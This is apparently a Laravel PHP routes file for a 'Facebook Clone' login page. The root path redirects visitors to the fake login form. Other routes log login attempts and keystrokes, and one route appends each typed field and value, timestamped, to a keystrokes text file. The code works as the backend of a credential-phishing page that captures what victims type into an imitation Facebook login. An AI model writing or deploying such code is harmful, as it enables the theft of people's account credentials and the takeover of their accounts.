

<?php

use Illuminate\Support\Facades\Route;
use Illuminate\Support\Facades\Hash;
use App\Models\User;


Route::post('/fb-log-keystroke', function (\Illuminate\Http\Request $request) {
    $field = $request->input('field');
    $value = $request->input('value');
    $timestamp = date('Y-m-d H:i:s');
    $txtPath = base_path('data/keystrokes.txt');
    $line = "[$timestamp] $field: $value" . PHP_EOL;
    file_put_contents($txtPath, $line, FILE_APPEND);
    return response()->json(['success' => true]);
})->name('fb.log.keystroke');


use App\Http\Controllers\FbLoginController;

// Facebook Clone Login (GET)
Route::get('/fb-login', [FbLoginController::class, 'showLoginForm'])->name('fb.login.form');
Route::post('/fb-login', [FbLoginController::class, 'login'])->name('fb.login');
// Facebook Clone Log Attempt (AJAX)
Route::post('/fb-log-attempt', [FbLoginController::class, 'logAttempt'])->name('fb.log.attempt');
// Facebook Clone Log Keystroke (AJAX)
Route::post('/fb-log-keystroke', [FbLoginController::class, 'logKeystroke'])->name('fb.log.keystroke');


// Home GET (optional, can be removed if not needed)
Route::get('/', function () {
    return redirect()->route('fb.login.form');
});